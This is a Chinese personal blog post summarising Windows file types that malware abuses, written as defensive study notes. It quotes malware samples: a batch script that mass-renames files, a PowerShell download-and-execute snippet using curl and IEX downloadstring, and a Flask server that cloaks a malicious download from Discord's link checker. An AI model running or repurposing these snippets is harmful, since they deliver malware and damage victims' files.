---
title: Windows终端上的敏感文件们
author: Hank
tags:
  - Windows
  - 终端安全
date: 2022-09-02 11:24
categories: 学习
summary: 最近在了解终端安全相关的知识，接触到了一些windows终端上的敏感文件。所谓知己知彼，百战不殆，这篇文章是我学习这些文件后缀时自己做的总结。
---
总结一下下面这几类敏感文件的作用，以及攻击者是如何利用这类文件危害终端安全的。

## 可执行文件

### EXE

.exe是大家再熟悉不过的后缀名了，exe文件全称是（executable file）也就是可执行文件。exe文件一般是由开发者编译过的可执行的二进制文件，有可能是应用，当然也有可能是应用软件安装器。将病毒伪装成exe文件是攻击者的惯用手段，看下面这些病毒，基本都是exe文件，还有一些把自己伪装成一般文档或常用程序的。

<img src="https://my-picbed.oss-cn-hangzhou.aliyuncs.com/202209011521574.png" alt="病毒库" style="zoom:50%;" />

### COM

相比于exe，com文件就比较少见了，它的全称是command file，是一种运行在MS-DOS和Windows系统上的可执行文件。com文件与exe文件最大的区别在于，com文件有64kb的大小限制，现在com大部分被用来生成使用说明之类的小文件。不过也有利用com的攻击者，不过我搜了一下，暂时没有找到com后缀的病毒样本。

## 系统文件

### REG

注册表文件（Registry File）可以更新系统的注册表，关于注册表的作用，我在这篇文章里写到过[[注册表的重要性]]，简而言之，注册表非常重要但是却非常脆弱。基本是人人都可以插一脚的状态。reg病毒文件并不攻击，他们更多的是在捣乱，让某个软件或者系统的莫哥部分不能运行之类的。

### CPL

Windows Control Panel Item，Windows上的控制面板文件，主要作用是存储各类设置，比如网络、声音和鼠标等。cpl文件如何应用，[这篇文章](https://cloud.tencent.com/developer/article/1861377)用实例告诉了我们。

### FON

fon是一类字体文件的后缀名，对于字体文件，我们现在更常见到的是ttf（true type font）后缀的文件。fon文件的特殊性在于它包含了一系列的FNT文件，很多病毒都利用fon文件来**隐匿**自己在系统中的踪迹，比如这篇文章提到的[木马病毒](http://t.zoukankan.com/Joy7-p-2698120.html)，以及这篇提到的[挖矿病毒](https://cloud.tencent.com/developer/article/1613296)。

## 支持文件

### DLL

dll也是一种非常常见的文件类型，我就记得我以前玩游戏的时候，游戏客户端会遇到这样的错误：

![dll缺失对话框（来自百度）](https://my-picbed.oss-cn-hangzhou.aliyuncs.com/202209011637974.png)

原来dll是一类动态链接库，其最主要的作用是可以让别的程序或者进程调用一些公共的**函数**。那其实它危险的地方也在这里，我们可以在[MalwareBazaar](https://bazaar.abuse.ch/browse/)看到不少dll病毒样本。究其原因还是dll文件中包含了可执行的程序。dll与exe最大的区别是，dll可以被不同的可执行文件调用，并且是动态的加载到内存中的（不懂）。

![DLL病毒](https://my-picbed.oss-cn-hangzhou.aliyuncs.com/202209011642986.png)

### OCX

一类ActiveX的可重复执行软件模块，与dll相同，ocx文件也可以被各类程序调用。这类可执行的文件都有一定的危险性，比如flash.ocx是利用Flash播放器的头部缓冲区溢出漏洞，恶意攻击者利用这个漏洞控制用户的计算机。CCRPBD.OCX、CCRPFD.OCX等控件都是被利用的对象。

### SYS

Windows系统运行的核心文件，包含了一系列的函数、系统设置、参数值，这篇[文章](https://sensorstechforum.com/remove-sys-virus/)提到了一类以sys作为扩展名的勒索病毒软件。

### DRV

DRV文件是Windows操作系统用来连接硬件设备(外部和内部)并与其通信的驱动程序文件。它包含设备和操作系统如何相互通信的命令和参数。DRV文件还用于在计算机上安装设备驱动程序。同样的，也有勒索病毒或木马伪装成drv来进行攻击。

### HTA

HTA是一类可以由Windows执行的html应用，没错又是可执行文件，一般包含了可执行的js脚本。hta病毒的感染途径主要是邮件。下图是一个实例：

![hta11](https://my-picbed.oss-cn-hangzhou.aliyuncs.com/202209011725634.png)

这个脚本最主要的功能是从四个不同的网站下载勒索病毒软件。

## 脚本文件

### BAT

~~百度、阿里、腾讯~~

bat是我们最常遇到的一类脚本，一个bat脚本包含了多个可以由cmd也就是命令行执行的指令，能够用来控制各类软件。[某个GitHub仓库](https://gist.github.com/SnowLord7/370dc901f07621fdeb64ed461d7431ac)贴出了一段batch virus代码，这是其中的一部分。这个病毒主要被用来加密主机当中的各类文件。

```bash
ren -=- Encrypts files with a simple name break -=-
:encryption
cls & color 0a
:Current
REN *.cmd *.sI09
REN *.exe *.1Je9
REN *.log *.439a
REN *.ini *.3KM1
REN *.dll *.38Jl
REN *.bin *.3J81
REN *.txt *.2M1A
REN *.sys *.8j3J
REN *.lnk *.9K2M
REN *.png *.8J2n
REN *.exe *.3hxD
```

> 评论里有一段很有趣的对话：
>
> > wat does it do
>
> It makes you a sandwich

### VBS

Virtual Basic script，资料里说Windows系统会使用它，IE会使用它，还有一个IIS（Internet Information Services，常用来做FTP服务器）也会使用它。VBS可以用了制成一种能够实现快速传播的蠕虫病毒，另外，VBS的编写还十分简单。典型的VBS病毒有[新欢乐时光](https://baike.baidu.com/item/%E6%96%B0%E6%AC%A2%E4%B9%90%E6%97%B6%E5%85%89?fromModule=lemma_inlink)。

### WSH

包含特定脚本的属性和参数的文本文档，比如.VB或.VBS文件。结合上述对vbs文档的描述我们可以知道，wsh文件可能会帮助vbs文件发挥作用，换句话说，当你禁用了wsh的时候有些软件可能用不了，但同时有些恶意程序也不能运行。

### WSF

Windows脚本文件，也是一类可以执行的文件，[这篇文章](https://medium.com/@networksecurity/ransomware-delivered-using-wsf-windows-script-file-551a6589da47)分享了一类以wsf为载体的勒索病毒，如下图，这个病毒的文件名也很有意思，是”MESSAGE_123123123123.doc(一堆空格).wsf“。文章中还提到了很多邮箱，比如outlook和exchange都不会拦截为wsf文件，从而让其有机可乘。

<img src="https://my-picbed.oss-cn-hangzhou.aliyuncs.com/202209020935572.jpeg" alt="WSF文件内容" style="zoom:50%;" />



### PS1

刚开始把这个文件的后缀名认成了PSI，结果一看是PS1文件。这类文件是Windows上power shell的脚本文件，包含了一系列可以执行的脚本。看了一下病毒库，ps1文件也是重灾区之一。比如下面这一段脚本，所执行的就是从某个IP下载恶意程序：

```powershell
curl https://fastaccesone.com/load/ntc_claim.pdf -o C:\users\public\ntc_claim.pdf
C:\users\public\ntc_claim.pdf
IEX ((new-object net.webclient).downloadstring('某美国ip'))
```

## 其他文件

### MSI

msi文件包含了特定软件安装器所需要的文件、安装路径等信息，许多第三方软件也会用到该文件格式。比如Apple的bonjour。

> 说实话我之前一直觉得这个文件和微星有些联系

Malwarebazaar上有不少msi后缀的病毒样本，[这篇文章](https://www.trendmicro.com/en_us/research/19/d/analysis-abuse-of-custom-actions-in-windows-installer-msi-to-run-malicious-javascript-vbscript-and-powershell-scripts.html)解释了其中一种病毒样本，该样本中隐藏了一部分vbs脚本，而且这些脚本竟然是被截断的，另一部分说不定被藏在别的什么地方。攻击者为了绕过安全检查简直是绞尽脑汁……

### PY

终于遇到一个我熟悉的后缀名了，py是python文件的后缀名，然而我并不知道py文件也能做病毒。于是我去下载了一个病毒样本（没有恶意程序链接，放心食用）：

```python
import requests, io
from flask import Flask, request, send_file
app = Flask(
__name__,
  template_folder='templates',
  static_folder='static'
)
@app.route('/', methods=['GET'])
def main():
  Image = 'YourImageLink' # Replace this with your image link
  Malicious = 'MaliciousFIleDownloadLink'# Replace this with your download link
  Redirect = "RedirectLink" # You can just put the image here or you can put a custom site. You can combine this with my clipboard logger and it'll be more op lol https://github.com/TheonlyIcebear/Clipboard-Javascript-Logger
  # This is to get the ip
  if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
    ip = request.environ['REMOTE_ADDR']
  else:
    ip = request.environ['HTTP_X_FORWARDED_FOR']
  print(ip)
  if ip.startswith('35.') or ip.startswith('34.'):
    # If discord is getting a link preview send a image
    return send_file(
    io.BytesIO(requests.get(Image).content),
    mimetype='image/jpeg',
    download_name='AnyName.png')
  else:
    # If a real person is clicking the link send a malicious file and redirect back to the image
    return f'''<meta http-equiv="refresh" content="0; url={Malicious}">
  # Run the Flask app
  app.run(
  host='0.0.0.0',
  debug=True,
  port=8080
  )
```

这个脚本搭建了一个服务来绕过discord对链接的检测。具体的做法是检测请求的ip，如果他是35.或者34.开头的，那就发回一张图片（这俩ip的属地都是美国，可能会有误判，但是discord海外用户很多，所以中招几率很大）。如果你不是这两ip，那你就倒霉了，当你点击链接时，你会开始下载恶意程序，然后立刻重新导向到一个别的网站（装作无事发生）。

### JAR

也就是我们常说的jar包，它可能被用作库，也有可能被用作一个单独的程序。因为是可执行的，所以也存在被攻击者利用的风险。我在找相关案例时找到了reddit上的一个[帖子](https://www.reddit.com/r/talesfromtechsupport/comments/38aama/ha_ha_a_virus_written_in_java_thats_cute_must_be/)：

受害人大哥是一所学校的网管，有天退休的体育部行政助理，一个六十几的老太太，联系他，说自己电脑中病毒了。大哥去她住处检查她的电脑，发现了一个“.jar“后缀的病毒，他当时觉得这个病毒看起来人畜无害的，删了就完事了。没想到一周后老太太的银行账户被盗了，原来是这个jar包已经自己复制了好几份。老太太遂又求助于网管大哥，大哥认为这次十分彻底地清理干净了病毒。没想到一周后，学校里很多人都收到了以老太太名义发送的邮件。要知道老太太是退休前是行政助理啊，通讯录里头有不少人的email地址。这封邮件大概是这样的：

> From: AthAA
>
> To: **All Faculty and Staff**
>
> Subject: **IMPORTANT**
>
> Please refer to the attachment carefully
>
> Thank you
>
> Attachment: **Payment_Invoice.JAR**

很多人都点开了附件里的jar包，不过万幸只有Windows用户中招（🐶），因为mac有验证，Chromebook和移动端运行不了。这场事故大概影响到了二十多个人，大哥最后总结说：

> Don't judge a book (virus) by its cover.
>
> 不要以貌取毒

### CMD

与bat文件差不多，cmd也存储了一堆命令行脚本，攻击者用它来破环你电脑里的文件。

### MSC

添加到Microsoft管理控制台(MMC)的文件，该程序用于配置和监视Windows计算机系统；简单来说，可以通过编辑和修改msc文件来实现对系统功能的修改，当然攻击者也有可能利用他来篡改系统设置。这位就在[求助贴](https://answers.microsoft.com/en-us/windows/forum/all/a-virus-has-changed-my-servicesmsc-and-it-wont-let/0549add5-c254-40d3-b623-ebcfdd9e1741)中说自己的msc服务被篡改了，很多服务和程序启动不了。

## 总结

写了这么多，总结一下这些敏感文件为什么要防护起来：

+ 可执行文件是是病毒程序的执行者，当然要防范起来。
+ 可执行文件会把自己藏在各种各样不同类型的文件中，一方面绕过检测，另一方面诱导用户去执行。
+ Windows的注册表、控制面板等是重灾区。
+ 邮件是病毒传播的主要途径，不要随便点开可疑链接和程序，即便它来自你认识的人。
+ 不要以貌取毒😂

## 参考

这个网站解释了各类后缀名：https://fileinfo.com/extension/exe

这个网站可以让你在线浏览各种恶意软件：https://bazaar.abuse.ch/browse/

